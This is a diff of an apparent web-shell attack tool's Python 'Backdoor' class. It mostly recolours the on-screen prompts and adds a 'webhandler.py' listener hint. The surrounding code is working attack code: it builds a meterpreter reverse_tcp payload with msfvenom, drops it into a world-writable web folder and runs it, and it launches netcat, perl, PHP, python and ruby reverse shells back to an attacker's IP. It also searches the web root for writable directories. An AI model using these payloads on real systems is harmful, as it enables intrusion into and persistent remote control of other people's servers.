@@ -42,7 +42,7 @@ class Backdoor(object):
                 filename = ''.join(choice(string.ascii_letters + string.digits) for x in range(8))
                 print '{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
                 path = '{0}/{1}'.format(folder, filename)
-                raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST={1} LPORT={2} E)\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+                raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST={1} LPORT={2} E)\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
                 print '[i] Generating linux/x86/meterpreter/reverse_tcp'
                 shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf | base64'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
                 cmd = 'echo "{0}" | base64 -i -d > {1} && chmod +x {1} && nohup {1} &'.format(shell, path)
@@ -63,7 +63,7 @@ class Backdoor(object):
             for path in netcat:
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
             for path in netcat:
                 cmd = 'nohup {0} {1} {2} -e /bin/bash &'.format(path, ip, port)
                 make_request.get_page_source(cmd)
@@ -81,7 +81,7 @@ class Backdoor(object):
             for path in perl:
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
             for path in perl:
                 cmd = 'nohup {0} -e '.format(path)
                 cmd += '\'use Socket;'
@@ -97,7 +97,7 @@ class Backdoor(object):
 
     def php(self, ip, ourIP):
         wwwroot = linux.get_doc_root()
-        cmd = 'find {0} -depth -perm -0002 -type d | sort -R | head -n 1'.format(wwwroot)
+        cmd = 'find {0} -depth -perm -0002 -type d | sort -R '.format(wwwroot)
         folder = make_request.get_page_source(cmd)
         if folder:
             folder = folder[0]
@@ -168,7 +168,7 @@ class Backdoor(object):
             for path in php:
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
             for path in php:
                 cmd = 'nohup {0} -r '.format(path)
                 cmd += '\'$sock=fsockopen("{0}",{1});'.format(ip, port)
@@ -187,7 +187,7 @@ class Backdoor(object):
             for path in python:
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
             for path in python:
                 cmd = 'nohup {0} -c '.format(path)
                 cmd += '\'import socket,subprocess,os;'
@@ -211,7 +211,7 @@ class Backdoor(object):
             for path in ruby:
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
             for path in ruby:
                 cmd = 'nohup {0} -rsocket -e'.format(path)
                 cmd += '\'f=TCPSocket.open("{0}",{1}).to_i;'.format(ip, port)
@@ -247,7 +247,7 @@ class Backdoor(object):
             for path in xterm:
                 print '{0}{1:2d}.) {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
-            #raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            #raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{4} (hint: python webhandler.py -l {2} OR nc -lvvp {2})\n{3}[?] Press <return> when ready!{4}'.format(Colors.GREEN, ip, port, Colors.YELLOW, Colors.END))
             for path in xterm:
                 cmd = 'nohup {0} xterm -display {1}:1 &'.format(path, ip)
                 make_request.get_page_source(cmd)
